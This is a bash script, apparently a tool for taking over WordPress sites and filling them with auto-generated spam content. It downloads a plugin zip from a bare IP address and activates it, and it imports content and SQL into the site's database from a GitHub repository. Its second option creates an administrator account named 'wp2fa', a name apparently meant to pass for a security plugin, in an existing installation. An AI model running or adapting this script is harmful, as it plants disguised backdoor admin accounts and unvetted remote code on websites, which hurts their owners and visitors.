#!/bin/bash 
# Reina Akiara v.0.1




_INSTALLWP() {
	owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
	source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
	xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
	sql_agc=""
	if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi

	echo -e ""
	#	----	VAR		----
	echo -e "[+][STEP 1]==================================="
	echo ""
	read -p $" [+] Directory name: " dir
	read -p $" [+] DB HOST       : " dbhost
	read -p $" [+] DB NAME       : " dbname
	read -p $" [+] DB USER       : " dbuser
	read -p $" [+] DB PASSWORD   : " dbpass
	read -p $" [+] DB PREFIX     : " dbprefix
	echo ""
	echo -e "[+][STEP 2]==================================="
	echo ""
	read -p $" [+] URL [e.g:example.com]     : " url
	read -p $" [+] TITLE                     : " title
	read -p $" [+] ADMIN USERNAME            : " username
	read -p $" [+] ADMIN PASSWORD            : " password
	read -p $" [+] ADMIN EMAIL               : " email

	echo -e ""
	echo -e "[~] Downloading Wordpress"
	wget -q https://wordpress.org/latest.zip && unzip -q "latest.zip" && mv "wordpress" ${dir} && cd ${dir}
	
	echo -e "[~] Downloading wp-cli.phar..."
	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	#	Creating config file
	php wp-cli.phar core config --dbhost="${dbhost}" --dbname="${dbname}" --dbuser="${dbuser}" --dbpass="${dbpass}" --dbprefix="${dbprefix}" $extra
	php wp-cli.phar core install --url="${url}" --title="${title}" --admin_user="${username}" --admin_email="${email}" $extra
	php wp-cli.phar user list $extra

	php wp-cli.phar user update 1 --user_pass="${password}" $extra
	echo -e "[+] password: ${password}"

	echo -e "[+] ========================================= [+]"
	echo -e "[~] Changing Permalinks..."
		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
	echo -e "[~] Installing Plugin..."
	php wp-cli.phar plugin install ${source_campaign} --activate $extra
	#php wp-cli.phar cron event list $extra

	php wp-cli.phar plugin install wordpress-importer --activate $extra
	wget ${xml_agc} -O agc.xml
	php wp-cli.phar import agc.xml --authors=create $extra



	#	ENTERING KEYWORD
	#php wp-cli.phar db query "DROP TABLE IF EXISTS $(php wp-cli.phar db prefix $extra)wp_api_keys" $extra

	#	CREATING wp_api_keys TABLE
	#echo -e "[~] CREATING wp_api_keys TABLE"

	#php wp-cli.phar db query "CREATE TABLE $(php wp-cli.phar db prefix $extra)wp_api_keys ( id int(11) NOT NULL AUTO_INCREMENT,idmd5 varchar(50) CHARACTER SET latin1 NOT NULL,title text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,slug text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,category varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL,target_uv varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL,status varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL, PRIMARY KEY (id),  UNIQUE KEY idmd5 (idmd5)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci" $extra
	
	#	CREATING wp_api_keys TABLE
	#echo -e "[~] CREATING wp_api_keys TABLE"

	#php wp-cli.phar db query "INSERT INTO $(php wp-cli.phar db prefix $extra)wp_api_keys ( id , idmd5 , title , slug , category , target_uv , status ) VALUES ( 1 , "


	# 	wp core config --dbhost=host.db --dbname=prefix_db --dbuser=username --dbpass=password
	#	wp core install --url=yourwebsite.com --title="Your Blog Title" --admin_name=wordpress_admin --admin_password=4Long&Strong1 --admin_email=you@example.com
}
_INSTALLAGC() {
	username="wp2fa"
	source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
	xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
	sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"


	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	#	Creating User
	php wp-cli.phar user create ${username} admin@gmail.com --role=administrator
	echo -e "[+] Username: ${username}"
	echo -e "[~] Changing Permalinks..."
		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'"
		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'"
	echo -e "[~] Installing Plugin..."
	php wp-cli.phar plugin install ${source_campaign} --activate
	#php wp-cli.phar cron event list $extra

	php wp-cli.phar plugin install wordpress-importer --activate
	wget ${xml_agc} -O agc.xml
	php wp-cli.phar import agc.xml --authors=create
	wget ${sql_agc} -O agc.sql
	sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
	php wp-cli.phar db import agc.sql
}





echo -e "[~] Checking WP-CLI.phar is supported or no"
curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
if [[ $(php wp-cli.phar $extra | grep "WP-CLI only works correctly from the command line") ]];
then
	echo -e "[!] wp-cli not supported!" && exit
else
	echo -e "[+] wp-cli supported!"
fi

rm -rf "wp-cli.phar"

echo -e "
[+] ===============================

  [1] Install Wordpress & AGC
  [2] Install AGC

[+] ===============================
"
read -p $": Select Option : " option

if [[ $option == "1" ]];
	then
		_INSTALLWP 
elif [[ $option == "2" ]];
	then
		_INSTALLAGC
elif [[ $option == "0" ]];
	then
		exit
else
	echo -e "sams"
fi


rm -rf "agc.xml" && rm -rf "wp-cli.phar"
#	php wp-cli.phar db query "UPDATE wp_options SET option_value = '%postname%' WHERE option_name = 'permalink_structure'"


#	php wp-cli.phar plugin install wordpress-importer --activate
#	wget import https://raw.githubusercontent.com/rootraven04/named/main/agc.xml 
#	php wp-cli.phar import agc.xml --authors=create


# php -r "$msgid = "";$oldMessage = 'blogwpx_';$deletedFormat = '$(php wp-cli.phar db prefix $extra)';$str=file_get_contents('agc.sql');$str=str_replace($oldMessage, $deletedFormat,$str);file_put_contents('agc.sql', $str);"
